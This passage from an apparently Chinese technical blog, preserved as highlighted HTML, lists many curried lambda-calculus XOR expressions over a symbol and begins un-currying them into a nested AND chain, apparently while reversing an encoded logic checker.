class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]<br><br></code></pre></td></tr></table></figure><p>对这些表达式进行反 currying 操作</p><figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scheme">(<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span class="hljs-name">AND</span> (<span 